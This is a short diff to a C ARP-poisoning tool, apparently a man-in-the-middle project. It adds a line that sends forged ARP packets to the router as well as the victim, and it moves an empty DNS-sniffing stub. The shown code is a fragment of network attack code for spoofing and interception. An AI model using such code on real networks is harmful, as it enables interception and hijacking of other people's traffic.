@@ -45,12 +45,11 @@ void arp_poison(struct config *c)
     while (1)
     {
         sendto(sd, to_victim, packet_size, 0, (struct sockaddr *)&device, sizeof(struct sockaddr_ll));
+        sendto(sd, to_router, packet_size, 0, (struct sockaddr *)&device, sizeof(struct sockaddr_ll));
         sleep(1);
         fprintf(stdout, "ARP\n");
     }
 }
-
-void dns_sniff() {}
 
 struct arp_header *build_arp_poison(struct config *conf, int to)
 {
@@ -121,4 +120,8 @@ void fillSLL(struct sockaddr_ll *sll, struct ifreq *ifr, int *sd)
     memcpy(sll->sll_addr, ifr->ifr_addr.sa_data, 8);
     memset(sll->sll_addr + 6, 0, 2);
     sll->sll_halen = ETH_ALEN;
+}
+
+void dns_sniff(struct config *c)
+{
 }
